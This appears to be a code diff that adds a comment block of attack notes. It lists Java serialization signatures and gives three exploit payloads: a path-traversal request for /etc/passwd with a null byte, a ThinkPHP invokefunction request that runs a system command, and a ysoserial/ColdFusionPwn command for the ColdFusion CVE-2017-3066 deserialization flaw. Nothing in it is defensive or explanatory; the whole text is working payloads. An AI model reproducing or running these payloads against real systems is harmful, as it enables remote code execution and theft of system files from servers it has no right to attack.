@@ -1,0 +1,15 @@
+/*
+ AC ED 00 05
+ rO0
+ Content-type = ‘application/x-java-serialized-object
+ H4sIAAAAAAAAAJ
+
+
+locale=../../../../../../../../../../etc/passwd%00en
+index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'
+
+
+https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2017-3066
+java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser
+
+ * */
